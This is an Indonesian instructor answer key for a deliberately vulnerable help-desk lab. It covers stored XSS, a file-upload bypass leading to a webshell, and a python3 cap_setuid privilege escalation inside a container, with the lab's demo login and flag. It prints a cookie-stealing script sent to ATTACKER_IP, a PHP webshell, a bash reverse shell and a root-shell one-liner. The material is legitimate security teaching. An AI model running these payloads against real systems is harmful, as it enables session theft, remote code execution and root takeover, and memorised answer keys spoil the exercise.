# Kunci Jawaban Instruktur - Lab TeknoBantu

> **Dokumen ini TIDAK ikut di-COPY ke image Docker.** Hanya untuk instruktur/penilai.

Total temuan yang harus dilaporkan peserta: **3** (2 kerentanan web + 1 privilege
escalation level container). Tidak seperti Lab 1, kedua kerentanan web di sini **tidak**
wajib berantai - hanya File Upload yang perlu berujung ke shell.

---

## 1. Stored XSS - `staff/ticket.php` (field `deskripsi`)

**Lokasi bug:** `app/www/staff/ticket.php`

```php
<h2>Deskripsi Masalah</h2>
<div class="ticket-description">
    <?= nl2br($ticket['deskripsi']) ?>
</div>
```

`nl2br()` **hanya** mengubah `\n`/`\r\n` menjadi `<br>` - tidak melakukan HTML-encoding
apa pun. Field `subjek` di halaman yang sama justru sudah benar
(`htmlspecialchars($ticket['subjek'])`) - ini adalah kontras yang disengaja, mirip pola
`dashboard.php` yang benar di Lab 1: bukan semua field rentan, peserta harus menguji
satu per satu.

**PoC:**

1. Isi form tiket publik (`/index.php`) dengan:
   - Subjek: `Laporan XSS (uji)`
   - Deskripsi:
     ```
     Halo tim IT, ada kendala.<script>fetch('http://ATTACKER_IP:4444/steal?c='+encodeURIComponent(document.cookie))</script>
     ```
2. Jalankan listener sederhana di mesin penyerang, mis. `python3 -m http.server 4444`
   (cukup untuk melihat request masuk beserta cookie di query string).
3. Login memakai akun demo staff (`demo.staff` / `DemoStaff123!` - lihat `README.md`),
   buka tiket yang baru dibuat dari dashboard.
4. Payload `<script>` berjalan di konteks browser staff; request keluar ke listener
   penyerang membawa `document.cookie` (mis. `PHPSESSID=...`), membuktikan sesi staff
   bisa dicuri jika staf sungguhan membuka tiket berbahaya ini.

**Catatan:** `session.cookie_httponly` sengaja dibiarkan default (Off) - tidak ada
konfigurasi tambahan yang diperlukan agar cookie theft berhasil dibuktikan.

**Kalibrasi:** field `subjek` dengan payload yang sama harus tampil sebagai teks biasa
(ter-escape), bukan tereksekusi - ini sengaja untuk peserta memvalidasi bahwa temuan
spesifik ke satu field, bukan menyeluruh.

---

## 2. Unrestricted File Upload -> shell `www-data` - `includes/upload.php`

**Lokasi bug:** `app/www/includes/upload.php`, dipakai dari `submit.php` (form publik
`/index.php`, field `lampiran`, tanpa autentikasi).

**Dua validasi lemah bertumpuk:**

```php
$blockedExtensions = ['php'];
if (in_array($extension, $blockedExtensions, true)) {
    throw new RuntimeException('Tipe file lampiran tidak diizinkan.');
}

$clientMimeType = $file['type'] ?? '';
if (strpos($clientMimeType, 'image/') !== 0) {
    throw new RuntimeException('Lampiran harus berupa gambar (screenshot).');
}
```

1. Blacklist ekstensi hanya menolak `.php` **persis** - developer mengira itu sudah
   cukup untuk memblokir eksekusi PHP. Padahal pada instalasi Apache +
   `libapache2-mod-php` bawaan Debian/Ubuntu (base image lab ini: `debian:bookworm-slim`,
   **bukan** image resmi `php:apache`; paket versi PHP di lab ini: `php8.2`), dua
   ekstensi lain **juga** dieksekusi sebagai PHP lewat `FilesMatch` bawaan paket
   (`/etc/apache2/mods-available/php8.2.conf`):
   ```
   .+\.ph(?:ar|p|tml)$
   ```
   yaitu `.phar` dan `.phtml` - keduanya lolos blacklist. Ini bukan konfigurasi
   tambahan yang kita suntikkan - ini default paket Debian `php8.2` apa adanya.
   **Catatan penting:** varian legacy seperti `.php3`/`.php4`/`.php5`/`.php7`/`.pht`
   (dari config PHP versi lama) **tidak** dieksekusi di stack PHP 8.x ini - upload-nya
   lolos validasi, tapi Apache hanya menyajikannya sebagai teks biasa (tidak RCE).
   Peserta perlu menemukan lewat percobaan bahwa `.phtml`/`.phar` yang benar-benar
   jalan, bukan sembarang ekstensi non-`.php`.
2. `$_FILES['lampiran']['type']` adalah Content-Type yang **dikirim klien sendiri**,
   trivial untuk dispoof di request multipart (mis. lewat Burp Repeater).
3. File disimpan sebagai `uploads/tickets/<ticket_id>_<nama_asli>` - `ticket_id`
   sekuensial dan **diberikan langsung** ke pengirim di halaman konfirmasi
   (`/confirmation.php?id=<id>`), jadi peserta tahu persis path lampirannya tanpa perlu
   brute force.

**PoC:**

1. Buat file `webshell.phtml` (atau `.phar`) berisi:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
2. Submit form tiket publik dengan field `lampiran` diisi `webshell.phtml`, tapi
   **spoof** header `Content-Type` bagian file tersebut di request multipart menjadi
   `image/jpeg` (mis. via Burp Repeater / curl
   `-F "lampiran=@webshell.phtml;type=image/jpeg"`).
3. Catat nomor tiket dari halaman konfirmasi (mis. `#7`).
4. Akses langsung:
   ```
   GET /uploads/tickets/7_webshell.phtml?cmd=id
   ```
   Respons menampilkan output `id` -> `uid=33(www-data) gid=33(www-data)`.
5. Untuk shell interaktif (diperlukan di langkah privesc), gunakan `cmd` untuk memicu
   reverse shell, mis.:
   ```
   cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
   ```

**Uji negatif/kalibrasi:**
- Upload `webshell.php` langsung harus **ditolak** dengan pesan "Tipe file lampiran
  tidak diizinkan."
- Upload `webshell.php3` (atau `.php4`/`.php5`/`.pht`) harus **lolos validasi** (tidak
  ditolak, ter-upload), tapi mengaksesnya lewat browser hanya menampilkan source
  code mentah (`<?php ... ?>`) sebagai teks, **bukan RCE** - membuktikan blacklist
  yang longgar saja tidak cukup, peserta juga perlu tahu ekstensi mana yang
  benar-benar dipetakan Apache ke handler PHP (`.phtml`/`.phar`).

---

## 3. Privilege Escalation www-data -> root - Linux capabilities misconfig pada `python3`

**Enumerasi (teknik berbeda dari `sudo -l` di Lab 1):**
```
getcap -r / 2>/dev/null
```
Menampilkan:
```
/usr/bin/python3.11 cap_setuid=ep
```

Capability ini dipasang saat build image (`docker/web/Dockerfile`):
```dockerfile
RUN setcap cap_setuid+ep "$(readlink -f "$(command -v python3)")"
```
Narasi: sysadmin dulu butuh script Python maintenance untuk mengelola file lampiran
tiket lama tanpa memberi akses sudo penuh, jadi memberi `python3` capability
`cap_setuid` sebagai "solusi cepat" - alih-alih systemd timer yang berjalan sebagai
root dengan benar - dan lupa dicabut.

**Eksploitasi (persis entry GTFOBins untuk python3 dengan capability `cap_setuid`):**
```
python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
```
(Bisa dipanggil sebagai `python3` biasa - symlink ke `python3.11` - capability tetap
ikut karena kernel me-resolve symlink ke file aslinya sebelum mengecek file
capability. Panggilan lain yang juga terverifikasi jalan: `os.system("/bin/sh")` atau
`import os,pty; os.setuid(0); pty.spawn("/bin/bash")`.)

Shell baru berjalan sebagai `uid=0(root)`, dikonfirmasi via `id` (`gid` tetap
`33(www-data)` karena capability yang dipasang hanya `cap_setuid`, bukan
`cap_setgid` - ini tidak mengurangi dampak: begitu `os.setuid(0)` membuat real/
effective/saved UID semuanya 0, proses non-setuid apa pun yang di-exec setelahnya
otomatis mendapat *full capability set* dari kernel - aturan kompatibilitas lama
Linux untuk proses yang "sudah full root" saat exec berlangsung. Makanya baik
`os.system()`, `os.execl()`, maupun `pty.spawn()` semuanya menghasilkan shell root
yang benar-benar penuh, bukan cuma label `uid=0` kosong). **Jangan** memanggil
`os.setgid(0)` secara terpisah - akan gagal dengan `PermissionError` karena
`CAP_SETGID` tidak dipasang, dan ini justru bagus untuk didiskusikan di sesi debrief
(capability Linux itu granular, tidak seperti sudo yang all-or-nothing).

**Kenapa ini bisa berhasil di container Docker biasa (tanpa `privileged`/`cap_add`):**
Docker menyertakan `CAP_SETUID`/`CAP_SETPCAP` di *bounding set* container secara default.
File capability yang sudah "dibakar" ke binary saat build time tidak memerlukan proses
pemanggil (`www-data`) untuk sudah memegang capability tersebut - kernel memberikannya
saat `execve()` selama capability itu ada di bounding set proses. `docker-compose.yml`
di lab ini sengaja **tidak** menambahkan `cap_drop`/`security_opt: no-new-privileges`,
karena keduanya akan mematikan jalur ini.

**Batas temuan:** ini adalah root **di dalam container `web`**, bukan root host. Container
tidak berjalan `privileged`, tidak mem-mount Docker socket, dan tidak memakai
`--pid=host`/`--net=host` - tidak ada langkah container escape di lab ini. Peserta harus
melaporkan dampak sesuai batas ini.

**Bukti pencapaian (flag):** setelah mendapat shell root, ada file yang langsung terlihat
di home root tanpa perlu dicari (`ls /root/`):
```
cat /root/flag.txt
```
Isinya:
```
TEKNOBANTU{c4p_s3tu1d_1s_n0t_sud0}
```
File ini dipasang saat build image (lihat `docker/web/Dockerfile`), permission `600`
milik `root:root` - hanya bisa dibaca setelah privesc berhasil, bukan sebelumnya (uji ini
dari shell `www-data`: `cat /root/flag.txt` harus gagal dengan `Permission denied`).

---

## Ringkasan Temuan

```
Recon (docker compose, port 8083 dipublikasikan eksplisit - bukan hidden port)
   -> Stored XSS di staff/ticket.php (dibuktikan lewat akun demo staff terpisah,
      TIDAK diperlukan untuk mendapat shell)
   -> Unrestricted File Upload (blacklist cuma tolak .php persis; .phtml/.phar lolos
      + tereksekusi + spoof Content-Type) di form tiket publik -> RCE -> shell
      sebagai www-data
   -> getcap -r / -> python3 cap_setuid+ep -> root shell (di dalam container)
   -> cat /root/flag.txt -> bukti pencapaian (TEKNOBANTU{c4p_s3tu1d_1s_n0t_sud0})
```
